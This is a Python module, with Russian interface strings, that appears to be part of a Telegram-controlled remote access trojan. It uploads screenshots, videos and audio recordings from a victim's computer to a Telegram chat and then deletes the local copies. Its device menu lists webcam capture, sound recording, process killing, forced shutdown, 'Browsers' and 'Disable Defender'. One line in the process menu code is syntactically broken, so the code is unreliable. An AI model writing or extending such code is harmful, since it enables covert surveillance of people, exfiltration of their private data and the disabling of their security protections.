import os
import random
import time
import asyncio
from telegram import Bot, ReplyKeyboardMarkup, KeyboardButton

def generate_temp_filename(extension):
    random_str = ''.join([str(time.time()).replace('.', '')[-6:], os.urandom(4).hex()])
    return os.path.join(os.getenv('TEMP'), f"tmp_{random_str}.{extension}")

async def send_message(user_id, text, reply_markup=None):
    try:
        bot = Bot(token=BOT_TOKEN)
        message = await bot.send_message(chat_id=user_id, text=text, reply_markup=reply_markup)
        return message.message_id
    except Exception as e:
        print(f"❌ Ошибка отправки сообщения: {e}")
        return None

async def delete_message(user_id, message_id):
    try:
        if message_id:
            bot = Bot(token=BOT_TOKEN)
            await bot.delete_message(chat_id=user_id, message_id=message_id)
    except Exception as e:
        print(f"❌ Ошибка удаления сообщения: {e}")

async def send_screenshot(user_id, filename, pending_message_id=None):
    try:
        bot = Bot(token=BOT_TOKEN)
        with open(filename, 'rb') as photo:
            await bot.send_photo(chat_id=user_id, photo=photo)
        os.remove(filename)
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки скриншота: {e}")
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return False

async def send_video(user_id, filename, pending_message_id=None):
    try:
        file_size = os.path.getsize(filename) / (1024 * 1024)
        if file_size > 50:
            print(f"❌ Видео слишком большое ({file_size:.2f} МБ)")
            if pending_message_id:
                await delete_message(user_id, pending_message_id)
            await send_message(user_id, f"❌ Видео слишком большое ({file_size:.2f} МБ)")
            os.remove(filename)
            return False
            
        bot = Bot(token=BOT_TOKEN)
        with open(filename, 'rb') as video:
            await bot.send_video(chat_id=user_id, video=video)
        os.remove(filename)
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки видео: {e}")
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return False

async def send_voice(user_id, filename, pending_message_id=None):
    try:
        bot = Bot(token=BOT_TOKEN)
        with open(filename, 'rb') as voice:
            await bot.send_voice(chat_id=user_id, voice=voice)
        os.remove(filename)
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки голосового сообщения: {e}")
        if pending_message_id:
            await delete_message(user_id, pending_message_id)
        return False

def create_message_type_menu():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📢 Вызвать сообщение"), KeyboardButton("⚠️ Вызвать предупреждение")],
        [KeyboardButton("❌ Вызвать ошибку"), KeyboardButton("🔙 Назад")]
    ], resize_keyboard=True)

def create_device_menu(device_name):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📸 Скриншот"), KeyboardButton(text="📸 Фото с веб-камеры")],
            [KeyboardButton(text="🎥 Сделать видео"), KeyboardButton(text="🎥 Видео с веб-камеры")],
            [KeyboardButton(text="🎙 Запись звука"), KeyboardButton(text="💬 Написать сообщение")],
            [KeyboardButton(text="🛡 Антивирус"), KeyboardButton(text="📊 Процессы")],
            [KeyboardButton(text="💀 Завершить процесс"), KeyboardButton(text="💀 Завершить определённый процесс")],
            [KeyboardButton(text="⌨️ Нажать комбинацию клавиш"), KeyboardButton(text="⬇️ Свернуть окно")],
            [KeyboardButton(text="📥 Свернуть все"), KeyboardButton(text="🖱 Дергать мышкой")],
            [KeyboardButton(text="🔊 Включить звук"), KeyboardButton(text="🔇 Выключить звук")],
            [KeyboardButton(text="🔌 Выключить ПК"), KeyboardButton(text="🔄 Перезагрузить ПК")],
            [KeyboardButton(text="🌐 Браузеры"), KeyboardButton(text="🛡 Отключить Defender")],
            [KeyboardButton(text="🔙 Назад")]
        ],
        resize_keyboard=True
    )

async def create_processes_menu(user_id, page=0):
    try:
        procs = modules['processes'].get_process_list()
        total_processes = len(procs)
        total_pages = (total_processes + 4) // 5
        start_index = page * 5
        end_index = start_index + 5
        
        keyboard = []
        message = f"📊 Процессов: {total_processes} | Страница {page + 1}/{total_pages}\n"
        
        for proc in procs[start_index:end_index]:
            keyboard.append([KeyboardButton(f"🔹 {proc['name']} (PID: {proc['pid']})")
        
        nav_buttons = []
        if page > 0:
            nav_buttons.append(KeyboardButton("⬅️ Назад"))
        if end_index < total_processes:
            nav_buttons.append(KeyboardButton("➡️ Вперед"))
        
        if nav_buttons:
            keyboard.append(nav_buttons)
        
        keyboard.append([KeyboardButton("🔙 Назад")])
        return ReplyKeyboardMarkup(keyboard, resize_keyboard=True), message
    except Exception as e:
        print(f"❌ Ошибка создания меню процессов: {e}")
        return None, f"❌ Ошибка получения процессов: {e}"

def initialize(bot_token, chat_ids, device_name):
    global BOT_TOKEN, CHAT_IDS, DEVICE_NAME
    BOT_TOKEN = bot_token
    CHAT_IDS = chat_ids
    DEVICE_NAME = device_name
